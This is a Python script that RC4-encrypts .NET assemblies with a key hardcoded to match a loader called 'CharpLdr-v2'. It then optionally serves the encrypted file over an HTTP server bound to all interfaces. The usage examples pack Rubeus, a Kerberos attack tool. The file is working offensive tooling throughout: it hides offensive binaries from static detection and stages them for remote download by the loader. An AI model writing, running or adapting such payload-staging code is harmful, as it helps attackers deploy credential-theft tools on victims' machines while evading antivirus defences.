#!/usr/bin/env python3
"""
encrypt_assembly.py -- RC4 encryption for .NET assemblies
Encrypts a .NET assembly with the same RC4 key hardcoded in CharpLdr-v2.
Optionally serves the encrypted file via a simple HTTP server.

Usage:
    python encrypt_assembly.py Rubeus.exe                    -> Rubeus.enc
    python encrypt_assembly.py Rubeus.exe -o custom.enc      -> custom.enc
    python encrypt_assembly.py Rubeus.exe --serve --port 8080 -> serves on :8080
"""

import sys
import os
import argparse
from http.server import HTTPServer, SimpleHTTPRequestHandler

# RC4 key -- MUST match the key in crypto.cpp (OBFSTR("ChArPLdR_v2_S3cr3t_RC4_K3y_2025!"))
RC4_KEY = b"ChArPLdR_v2_S3cr3t_RC4_K3y_2025!"

def rc4(data: bytes, key: bytes) -> bytes:
    """RC4 encryption/decryption (symmetric)."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    out = bytearray(len(data))
    for n in range(len(data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[n] = data[n] ^ S[(S[i] + S[j]) % 256]
    return bytes(out)

def main():
    parser = argparse.ArgumentParser(description="Encrypt .NET assemblies with RC4 for CharpLdr-v2")
    parser.add_argument("input", help="Input .NET assembly file (e.g., Rubeus.exe)")
    parser.add_argument("-o", "--output", help="Output encrypted file (default: <input>.enc)")
    parser.add_argument("--serve", action="store_true", help="Start HTTP server after encryption")
    parser.add_argument("--port", type=int, default=8080, help="HTTP server port (default: 8080)")
    parser.add_argument("--verify", action="store_true", help="Verify by decrypting and checking MZ header")
    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"[!] File not found: {args.input}")
        sys.exit(1)

    with open(args.input, "rb") as f:
        plaintext = f.read()

    print(f"[*] Input: {args.input} ({len(plaintext)} bytes)")

    # Check for MZ header
    if plaintext[:2] == b"MZ":
        print("[+] MZ header detected (valid PE)")
    else:
        print("[!] WARNING: No MZ header -- is this a .NET assembly?")

    # Encrypt
    ciphertext = rc4(plaintext, RC4_KEY)

    # Output filename
    output = args.output or os.path.splitext(args.input)[0] + ".enc"
    with open(output, "wb") as f:
        f.write(ciphertext)

    print(f"[+] Encrypted: {output} ({len(ciphertext)} bytes)")
    print(f"[+] RC4 key: {RC4_KEY.decode()} ({len(RC4_KEY)} bytes)")

    # Verify round-trip
    if args.verify:
        decrypted = rc4(ciphertext, RC4_KEY)
        if decrypted == plaintext:
            print("[+] Verification: PASS (decrypt matches original)")
        else:
            print("[!] Verification: FAIL (decrypt does not match!)")
            sys.exit(1)

    if args.serve:
        os.chdir(os.path.dirname(os.path.abspath(output)) or ".")
        print(f"\n[*] Starting HTTP server on 0.0.0.0:{args.port}")
        print(f"[*] Serving from: {os.getcwd()}")
        print(f"[*] Download URL: http://<your-ip>:{args.port}/{os.path.basename(output)}")
        print("[*] Press Ctrl+C to stop\n")

        httpd = HTTPServer(("0.0.0.0", args.port), SimpleHTTPRequestHandler)
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped")
            httpd.server_close()

if __name__ == "__main__":
    main()
